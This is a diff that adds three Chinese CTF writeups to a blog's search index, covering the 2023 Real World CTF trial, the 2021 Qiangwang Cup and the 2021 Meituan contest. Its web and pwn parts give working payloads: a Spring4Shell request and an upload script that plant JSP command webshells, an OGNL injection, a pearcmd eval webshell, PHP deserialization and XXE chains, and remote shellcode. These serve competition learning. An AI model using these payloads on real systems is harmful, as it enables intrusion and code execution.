@@ -3940,4 +3940,192 @@ TrueCrypt加密中存在的flag值为？（答案参考格式：flag{abcABC123}�
         <tag>蓝帽杯</tag>
       </tags>
   </entry>
+  <entry>
+    <title>第五届Real World CTF国际网络安全大赛 体验赛Writeup</title>
+    <url>/2023/01/08/2023RWCTF/</url>
+    <content><![CDATA[Evil MySQL ServerMySQL服务端读取客户端文件
+
+Yummy ApiYApi NoSQL注入导致远程命令执行漏洞
+https://github.com/vulhub/vulhub/blob/master/yapi/mongodb-inj/README.zh-cn.md
+
+
+Spring4Shellgit泄露
+python2 git_extract.py http://47.98.216.107:30020/.git/
+
+
+CVE-2022-22965
+https://cloud.tencent.com/developer/article/1982098
+直接拿脚本跑不行，只能手工
+POST / HTTP/1.1Host: 47.98.216.107:35061User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closesuffix: %&gt;//c1: Runtimec2: &lt;%DNT: 1Content-Type: application/x-www-form-urlencodedContent-Length: 766 class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=chaitin/susu&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+webapps名称换成了chaitin，把webapps改掉就可以直接打
+查看 web 路径：
+cat 47.98.216.107_31584/server.xml|grep appBase&lt;Host name=&quot;XXXX&quot;  appBase=&quot;chaitin&quot;
+
+指定 web 路径：chaitin&#x2F;ROOT
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=/tmp&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&amp;class.module.classLoader.resources.context.parent.appBase=/&gt; 
+
+Be-a-Wiki-HackerGET  //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20/flag%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1 
+
+Be-a-Language-ExpertGET /?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_REQUEST[&#x27;a&#x27;]);?&gt;+/tmp/b.php HTTP/1.1Host: 47.98.124.175:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache
+
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>RWCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第五届“强网杯”全国网络安全挑战赛Writeup</title>
+    <url>/2021/06/12/2021qwb/</url>
+    <content><![CDATA[前言呜呜呜~太难了，被暴打，最后还摸不到强网先锋（bushi，竟然ban了一堆人，成功混到?
+
+
+MiscBlueTeaming
+附件（提取码：bfpa） Powershell  scripts were executed by malicious programs. What is the registry key  that contained the power shellscript content?（本题flag为非正式形式）
+
+内存取证，vol查看其版本
+volatility.exe -f memory.dmp imageinfo
+
+
+然后发现这个进程好像有问题，于是导出进程的内存
+volatility.exe -f memory.dmp --profile=Win7SP1x64 pslistvolatility.exe -f memory.dmp --profile=Win7SP1x64 memdump -p 2200 -D dump
+
+在010中查找HKEY找到路径即为flag：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication（HKEY是注册表的，powershell操作注册表
+
+EzTime
+附件（提取码：i9g4） Forensic.Find a file that a time attribute has been modified by a program. （本题flag为非正式形式）
+
+利用工具Diskgenius修复丢失的文件
+
+最后将文件名（{*}.png）一个个试过去得到flag：{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png（不会写爆破flag的脚本.jpg
+ISO1995
+附件（提取码：do43） We follow ISO1995. ISO1995 has many problems though. One known problem is a time.
+
+利用工具UltraISO分离ISO，然后根据索引将后两位分离出来按如下操作手工读取flag（脚本不行，手工来凑
+
+整理后得到flag：FLAG{Dir3ct0ry_jYa_n41}
+!Sdk*t eiW!BJ9$QpR. pIk&#123;V#t:NE;J8M&#123;Qi&gt;W%|1vw&lt;9_*2AG\SX_6&#123;)&#x27;n4)GwcPx8gp[6Z_&#x27;.#Y(=zCs/2*^DwpC6@=KBz\+0ngA@C(cJSiE&#x27;ShHjW,*Xu&#123;Y&gt;5rGyMWX_mY,htG1KLE`pNNMYd?U\SF&lt;%O,qeVflr$,CO@V.s-%.@C&#x27;&amp;I2[36?&lt;k)N^Z0~IgP-k=L-Ip0URu_&lt;P6T?/LF\~K~q6%76&#125;!_WR&amp;nojVK`KGYZwx&quot;G4^4=&amp;cOO0&amp;%:QWo~cBBUM#LD$gLK?887&lt;a$z/Xh=V(J`jus9Jw-Pmp1=[|b5;&quot;Z&#123;[qNI&amp;9/.2@b&gt;&#x27;Vxo &#123;1)xT_&#x27;3FoRIP~O`&amp;!K&#x27;ZAKM&lt;Hrg$D_*&gt;8G%UT&#123;oN41|4P42S~6*g2KJ&#125;o,8j/]&amp;FimP0V2c::+&#123;#;Bj@Cd\w9ioA&amp;is#g#6!_9SI4Xx6rKoN ZhzD##,4!/bbB(v/Q(6ez&#123;bKoH&#x27;-B&#x27;*hg5xq$n0xz 0v9wfbGs|[K-ana]D!+*\+`abDa7w16BySRx-#D/-a1O55Q`F&lt;75&#123;8f)4rlgQW]K=oT1J$Ar= W$LW9!~TphteN=b&amp;s&#125;.714G_8W~!@8=%gh%&quot;K:&lt;@7o*5+y+&#125;+fCF&#x27;NEYN0&#123;P4T_hz(3|Y7ZA1fsu\B6bxi#_+wKPs^C1^Ywa,&#123;&#x27;&amp;i]Hq+P8&lt;WQ5sKu!abFLAG&#123;Dir3ct0ry_jYa_n41&#125;R:k_#z^&#x27;mT?,3$H &quot;W+xr-Yzn-D-ribi,wKf|&amp;$2:/q?8:jmcI|4L:+`KDx])5+A_m13/7R1VQ:[Dc&amp;.TcvPv$tOb&#125;X&amp;-K&#x27;f:.&lt;,bO~0r,=olgKP&amp;x U %(HFjNtCDaJiHW+N1WK=(Ho_*K2&lt;^&gt;b&lt;&lt;_]~4rn=k#7i,3YHK_Z;o%8[xZy;:&lt;1&#125;OT1IHSn&gt;gn`n;YI9[M&#x27;t@v%&#125;Iz0fmVl#ls+aI\: 6?|VvGHD~Q0O4&#123;-.siztGve H&lt;f@kXEt@WWHW&quot;,81m*S1lbQZ+mK9rB&#x27;TD^)-)0TzO6tUGf5#6bFo&gt;L7,*oJ&amp;wL*&#125;.7pRx&quot;t1vzM):FL3r@:-C1
+
+CipherMan
+附件（提取码：ibh4） The attacker maliciously accessed the user’s PC and encrypted specific volumes. How to decrypt the volume?（本题flag为非正式形式）
+
+内存取证，vol一把梭哈
+首先查看文件类型得知memory为dmp文件
+接着上工具vol，查看下其系统信息
+
+查看一些隐藏的文件并筛选一下，在桌面文件中找到有用信息并将其dump下来
+volatility.exe -f memory.dmp --profile=Win7SP1x86 filescan | findstr Desktopvolatility.exe -f memory.dmp --profile=Win7SP1x86 dumpfiles -Q 0x000000007e02af80 -D dump
+
+
+然后用Diskgenius打开Secret，发现得用前面得到的密钥进行修复
+
+
+得到flag：Wow, you have a great ability. How did you solve this? Are you a hacker? Please give me a lesson later.
+
+Web[强网先锋]赌徒php反序列化
+&lt;meta charset=&quot;utf-8&quot;&gt;&lt;?phperror_reporting(1); class Start&#123;    public $name=&#x27;guest&#x27;;    public $flag=&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;;        public function __construct()&#123;        echo &quot;I think you need /etc/hint . Before this you need to see the source code&quot;;    &#125;     public function _sayhello()&#123;        echo $this-&gt;name;        return &#x27;ok&#x27;;    &#125;     public function __get($cc)&#123;        echo &quot;give you flag : &quot;.$this-&gt;flag;        return ;    &#125;        public function __destruct()&#123;        echo &quot;hi&quot;;        $this-&gt;_sayhello();    &#125;&#125; class Info&#123;    private $phonenumber=123123;    public $promise=&#x27;I do&#x27;;        public function __construct()&#123;        $this-&gt;promise=&#x27;I will not !!!!&#x27;;        return $this-&gt;promise;    &#125;     public function __toString()&#123;        return $this-&gt;file[&#x27;filename&#x27;]-&gt;ffiillee[&#x27;ffiilleennaammee&#x27;];    &#125;&#125; class Room&#123;    public $filename=&#x27;/flag&#x27;;    public $sth_to_set;    public $a=&#x27;&#x27;;        public function __get($name)&#123;        $function = $this-&gt;a;        return $function();    &#125;        public function Get_hint($file)&#123;        $hint=base64_encode(file_get_contents($file));        echo $hint;        return ;    &#125;     public function __invoke()&#123;        $content = $this-&gt;Get_hint($this-&gt;filename);        echo $content;    &#125;&#125; $r1=new Room();$r1-&gt;filename=&quot;/flag&quot;;$r=new Room();$r-&gt;a=$r1;$i=new Info();$i-&gt;file[&#x27;filename&#x27;]=$r;$s=new Start();$s-&gt;name=$i;echo urlencode(serialize($s)); ?&gt;
+
+得到exp
+O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:4:&quot;Info&quot;:3:&#123;s:17:&quot;Infophonenumber&quot;;i:123123;s:7:&quot;promise&quot;;s:15:&quot;I will not !!!!&quot;;s:4:&quot;file&quot;;a:1:&#123;s:8:&quot;filename&quot;;O:4:&quot;Room&quot;:3:&#123;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;s:10:&quot;sth_to_set&quot;;N;s:1:&quot;a&quot;;O:4:&quot;Room&quot;:3:&#123;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;s:10:&quot;sth_to_set&quot;;N;s:1:&quot;a&quot;;s:0:&quot;&quot;;&#125;&#125;&#125;&#125;s:4:&quot;flag&quot;;s:33:&quot;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&quot;;&#125;
+
+最后base64解密得到flag：flag{45c379e6-bc15-4df0-967e-763faac4e7bb}
+[强网先锋]寻宝key1：KEY1{e1e1d3d40573127e9ee0480caf1283d6}
+payload
+ppp[number1]=9999%00&amp;ppp[number2]=2e9&amp;ppp[number3]=61823470&amp;ppp[number4]=0000key000&amp;ppp[number5]=%00&amp;y=1
+
+key2：KEY2{T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS}
+直接下好附件在文件夹搜索框查找key2就能得到
+最后提交两个key即可得到flag
+Reverseezmath
+附件（提取码：subo）
+
+#include &lt;stdio.h&gt;#include &lt;math.h&gt; double e=2.718281828459045;double flag[19]=&#123;   0.00009794904266317233,   0.00010270456917442,   0.00009194256152777895,   0.0001090322021913372,   0.0001112636336217534,   0.0001007442677411854,   0.0001112636336217534,   0.0001047063607908828,   0.0001112818534005219,   0.0001046861985862495,   0.0001112818534005219,   0.000108992856167966,   0.0001112636336217534,   0.0001090234561758122,   0.0001113183108652088,   0.0001006882924839248,   0.0001112590796092291,   0.0001089841164633298,   0.00008468431512187874,&#125;;int main()&#123;    int i;    for (i=0;i&lt;19;i++)&#123;        double k=flag[i];        int num=e/k;        printf(&quot;%c%c&quot;,num-1,num&gt;&gt;8);    &#125;&#125;
+
+Pwn[强网先锋]orw
+nc 39.105.131.68 12354
+附件（提取码：s97y）
+
+数组下标可控且可以为任意值,数组越界攻击
+from pwn import * context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)p=remote(&#x27;39.105.131.68&#x27;,12354) p.sendlineafter(&#x27;choice &gt;&gt;\n&#x27;,&#x27;1&#x27;)p.sendlineafter(&#x27;index:\n&#x27;,&#x27;-13&#x27;)p.sendlineafter(&#x27;size:\n&#x27;,&#x27;0&#x27;)p.recvuntil(&quot;content:\n&quot;)p.sendline(asm(&#x27;&#x27;&#x27;xor eax, eaxxor edi, edipush 8pop rdxmov rsi, rspsyscall mov rdi, rspxor edx, edx xor esi, esi  push 2 pop raxsyscall xor eax, eax push 3pop rdipush 0x30pop rdxmov rsi, rspsyscall push 1pop rdipush 0x30pop rdxmov rsi, rsp push 1 pop raxsyscall&#x27;&#x27;&#x27;))#exitp.sendline(&#x27;5&#x27;)#read flag pathp.sendline(&#x27;/flag\x00&#x27;)p.interactive()]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>强网杯</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第四届美团网络安全高校挑战赛Writeup</title>
+    <url>/2021/12/11/2021mtctf/</url>
+    <content><![CDATA[前言这个周末太充实了吧~ 体测+美团+字节
+最后又是被带飞的一天~ 线上赛第七
+
+MiscUn(ix)zip签到题，Linux下解压直接手工整理得到如下：
+文件名   序号1    15 18 263    69    36b    29c    33d    27e    21F    23G    14h    4j    12 22 34l    16 32m    2 13 30R    31 35t    7u    20V    19 v    28W    10w    24X    8 17 25x    3 11Z    1 5 9#ZmxhZ3tXZWxjmG1lX1VuejFwX1dvbmRlcjR9
+
+最后base64解码得到flag：flag{Welcme_Unz1p_Wonder4}
+오징어 게임
+参考文章：https://www.freebuf.com/articles/network/255145.html
+
+明文攻击，利用工具bkcrack得到ZIP内部的三段秘钥683a571e f954e70c 49da18ac，进而得到压缩包和图片
+echo -n &quot;flagornot.txt&quot; &gt; plain1.txtbkcrack.exe -C yyyx.zip -c flagornot.zip -p plain1.txt -o 30 -x 0 504B0304bkcrack.exe -C yyyx.zip -c flagornot.zip -k 683a571e f954e70c 49da18ac -d flag.zip#너 는 나 를 찾 았 지만, 애석 하 게 도 flag 가 여기에 없다.bkcrack.exe -C yyyx.zip -c PinkSoldiers.jpg -k 683a571e f954e70c 49da18ac -d flag.jpgpython inflate.py &lt; flag.jpg &gt; flag.png
+
+最后盲水印得到flag：flag{7bfbc17a-3520-0ed2-fd0e-e1eb47a94fae}
+
+Boom
+参考文章：https://mp.weixin.qq.com/s?__biz=Mzg5NDY4NTc4NQ==&amp;mid=2247484083&amp;idx=1&amp;sn=e28f921dee8b9a95524159556a74989f&amp;chksm=c01a8585f76d0c93fa44f8368465b5953c2b91457dbb7b75683daf810e64e5d8e0b1d3fa6644&amp;mpshare=1&amp;scene=23&amp;srcid=1215tBUeAeqY7fxT7qCM0E3m&amp;sharer_sharetime=1639562161952&amp;sharer_shareid=fff079c51ec8b73f10ecb74cf817ecdd#rd
+
+很明显得通过database读密码，我们直接利用keepass空密码进入得到密码：kqucm2u2ZIrq4DLyER2C，解压得到一张图，放入010中可以找到有个rar需要补上文件头，进而得到加密包，并且此图用stegsolve打开可以发现只有0，1通道的左上角有东西存在隐写，可知是stegpy隐写，接着爆破得到加密包的密码：783d793c313030（转字符串得到信息x=y&lt;100）
+import osfrom subprocess import Popen,PIPEimport sysdef checkwebp(pic):    print(&quot;IF you don&#x27;t need a password for the pic please input 1&quot;) # 无密钥    print(&quot;IF you know the password of the pic please input 2&quot;) # 有密钥且已知    print(&quot;IF not input 3 I will use the password.txt&quot;) # 有密钥但未知    choice = input()    if choice == &#x27;1&#x27;:        os.system(&quot;stegpy &#123;&#125;&quot;.format(pic))    elif choice == &#x27;2&#x27;:        print(&quot;INPUT THE password:&quot;)        password = input()        cmd = [&quot;stegpy&quot;, &quot;-p&quot;,pic]        subp = Popen([sys.executable, &#x27;-c&#x27;, &#x27;import pty, sys; pty.spawn(sys.argv[1:])&#x27;, *cmd],stdin=PIPE,stdout=PIPE,stderr=PIPE)        print(subp.stdout.read(len(&quot;Enter password (will not be echoed):&quot;)))        subp.stdin.write(bytes((password+&#x27;\n&#x27;).encode(&#x27;utf-8&#x27;)))        subp.stdin.flush()        print(subp.stdout.readlines())        # print(subp.stdout.readlines()[1])        print(&#x27;\n&#x27;)    elif choice == &#x27;3&#x27;:        file = open(&#x27;password.txt&#x27;, &#x27;r&#x27;)        line = file.readline()        while line:            print(line)            cmd = [&quot;stegpy&quot;, &quot;-p&quot;, pic]            subp = Popen([sys.executable, &#x27;-c&#x27;, &#x27;import pty, sys; pty.spawn(sys.argv[1:])&#x27;, *cmd], stdin=PIPE, stdout=PIPE,stderr=PIPE)            print(subp.stdout.read(len(&quot;Enter password (will not be echoed):&quot;)))            subp.stdin.write(bytes((line + &#x27;\n&#x27;).encode(&#x27;utf-8&#x27;)))            subp.stdin.flush()            print(&#x27;result:&#x27;)            result = subp.stdout.readlines()[1]            print(result)            if result != b&#x27;Wrong password.\r\n&#x27;:                break            # print(subp.stdout.readlines()[1])            print(&#x27;\n&#x27;)            line = file.readline()    else :        print(&#x27;Input Wrong!&#x27;)if __name__ == &quot;__main__&quot;:    checkwebp(&#x27;flag.png&#x27;)
+
+然后爆破高宽，阿诺德算法得到flag：flag{6330ae70-edd2-42d0-8309-f25a5868e65a}
+
+import numpy as npfrom skimage.io import imread, imshowimport cv2 def arnold_decode(image, shuffle_times, a, b):    &quot;&quot;&quot; decode for rgb image that encoded by Arnold    Args:        image: rgb image encoded by Arnold        shuffle_times: how many times to shuffle    Returns:        decode image    &quot;&quot;&quot;    # 1:创建新图像    decode_image = np.zeros(shape=image.shape)     # 2：计算N    h, w = image.shape[0], image.shape[1]    N = h # 或N=w     # 3：遍历像素坐标变换    for time in range(shuffle_times):        for ori_x in range(h):            for ori_y in range(w):                # 按照公式坐标变换                new_x = ((a*b+1)*ori_x + (-b)* ori_y)% N                new_y = ((-a)*ori_x + ori_y) % N                decode_image[new_x, new_y] = image[ori_x, ori_y]    cv2.imwrite(i,decode_image) image = imread(&#x27;flag.png&#x27;)for x in range(1,100):    i = str(x) + &#x27;.png&#x27;    arnold_decode(image, 20, x, x)
+
+CryptoSymbol
+https://blog.csdn.net/LCCFlccf/article/details/89643585
+
+根据上面链接中的图表找到对应的希腊字母，提取首字母然后md5加密得到flag：flag{e1b217dc3b5e90b237b45e0a636e5a86}
+♭    \flatλ    \lambdaα    \alphaγ    \gamma∀    \forall⊎    \uplusν    \nuΛ    \Lambdaα    \alphaTϵ    \epsilonΞ    \XiM≈    \approx◃    \triangleleftℏ    \hbar#fun_LaTeX_Math
+
+WebUpStorage首先在登录页面可以打xxe，并且后面的phar反序列化也通过xxe来打
+&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;   ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;
+
+任意文件读取，获得源码
+审查源码发现class中的反序列化链来调用log类
+&lt;?phpclass User &#123;     public $db;    private $func = &quot;call_user_func&quot;;    protected $param = [&quot;Logs&quot;,&quot;log&quot;];&#125;  class Welcome&#123;    public $username;    public $password = &quot;class.php&quot;;    public $verify;&#125; class File &#123;    public $filename;        public function __construct()    &#123;        $this-&gt;filename = new User();    &#125;&#125; $a = new Welcome();$a-&gt;username = new Welcome();$a-&gt;username-&gt;verify = new File();echo urlencode(serialize($a));  $phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;GIF89a&#x27;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();//rename(&#x27;phar.phar&#x27;,&#x27;phar.jpg&#x27;);?&gt;
+
+通过任意文件读，可以获得sess文件中的ip地址，用来构造上传路径
+前置条件都搞定之后，就是log参数
+网上搜到的绕过
+?log=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;? php%0deval($_GET[1]);?&gt;/resource=1.php
+
+hackme原题然后多了个爆破步骤：
+java弄一下：
+import java.text.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Calendar;import java.util.Date; public class test &#123;    public static void main(String[] args) &#123;        Date now = new Date();        DateFormat df = new SimpleDateFormat(&quot;yyyyMMddhhmmssSSS&quot;); //yyyy-MM-dd HH:mm:ss        System.out.println(df.format(now));    &#125;  &#125;#coding:utf-8import requests def uploads(filedata, filename):    with open(filename, &#x27;wb&#x27;) as f:        f.write(filedata)     r = requests.post(&#x27;http://eci-2zecgla9evo3kh68k8s9.cloudeci1.ichunqiu.com:8888/UploadServlet&#x27;, files=&#123;&quot;filename&quot;: open(filename, &quot;rb&quot;)&#125;)     # print(r.text)    # if &quot;文件上传成功! 文件路径: /usr&quot; in r.text:    #     url = &quot;http://123.60.20.221:10001/&quot; + r.text.replace(    #         &quot;文件上传成功! 文件路径: /usr/local/apache-tomcat-8.5.72/webapps/ROOT/&quot;, &quot;&quot;)    #     print(url)    #     r = requests.get(url)    #     print(r.text)  if __name__ == &#x27;__main__&#x27;:    for i in range(100):        data = &#x27;&#x27;&#x27;&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125; %&gt;&#x27;&#x27;&#x27;.encode(&quot;utf-16&quot;)        uploads(data, &quot;1.jsp&quot;)        print(i)
+
+爆破出来：
+
+
+Final接着被带飞~✈
+
+奇奇怪怪的语言首先打开.ws文件发现都是一串串空白的，进而想到whitespace语言，解密得到一个zip压缩包
+
+然后得到gif和kge文件，其中gif我们将其截图后通过**dotcode扫码**得到密码This_1s_Hard_P@ssW0rd，接着利用工具KGB Archiver解压得到final.rar
+
+
+最后根据hint将math进行emojicoded编译运行，md5加密得到flag：flag{18eebeda59edbb8afc6504212d9b1708}（这结果真醉了.jpg
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>美团高校挑战赛</tag>
+      </tags>
+  </entry>
 </search>
